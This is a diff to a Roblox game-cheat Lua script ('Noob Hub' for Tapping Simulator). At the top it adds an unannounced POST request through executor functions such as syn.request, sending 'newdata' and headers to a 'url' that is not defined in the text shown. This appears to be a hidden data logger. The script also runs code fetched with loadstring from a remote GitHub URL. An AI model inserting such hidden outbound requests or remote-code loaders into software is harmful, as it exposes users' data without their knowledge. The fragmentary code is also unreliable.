@@ -1,3 +1,7 @@
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
 if game.PlaceId == 9498006165 then
@@ -6,13 +10,6 @@ local Window = OrionLib:MakeWindow({Name = "Noob Hub | [UPD24] Tapping Simulator
 OrionLib:MakeNotification({
 	Name = "Succesfully Loaded",
 	Content = "Noob Hub has been successfully loaded",
-	Image = "rbxassetid://7733964370",
-	Time = 5
-})
-
-OrionLib:MakeNotification({
-	Name = "User",
-	Content = "You are logged in as "..Player.Name..".",
 	Image = "rbxassetid://7733964370",
 	Time = 5
 })
